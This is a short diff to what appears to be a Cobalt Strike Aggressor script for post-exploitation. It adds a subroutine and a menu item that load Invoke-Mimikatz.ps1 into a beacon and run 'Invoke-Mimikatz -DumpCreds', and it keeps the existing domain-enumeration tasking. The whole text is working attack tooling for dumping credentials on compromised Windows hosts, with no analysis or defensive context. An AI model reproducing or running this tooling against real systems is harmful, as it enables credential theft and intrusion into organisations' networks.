@@ -37,7 +37,23 @@ sub task_enum_dom {
 
    # actually task the beacon
    task_powershell($beacon_id, 'Get-NetDomain"');
-   task_powershell($beacon_id, 'Get-NetGroup -GroupName "Domain Admins"');
+}
+
+sub task_mimikatz {
+   $beacon_id = $1;
+
+   $script_source = script_resource("Invoke-Mimikatz.ps1");
+
+   # get all of our data that we're going to upload
+   $handle = openf($script_source);
+   $data = readb($handle, -1);
+   closef($handle);
+
+   # task the beacon to import the powershell data
+   task_powershell_import($beacon_id, $data);
+
+   # actually task the beacon
+   task_powershell($beacon_id, "Invoke-Mimikatz -DumpCreds");
 }
 
 sub task_netview {
@@ -63,6 +79,13 @@ popup beacon_top {
      local('$bid');
      foreach $bid ($1) {
         task_enum_dom($bid);
+     }
+   }
+
+   item "Mimikatz" {
+     local('$bid');
+     foreach $bid ($1) {
+        task_mimikatz($bid);
      }
    }
 
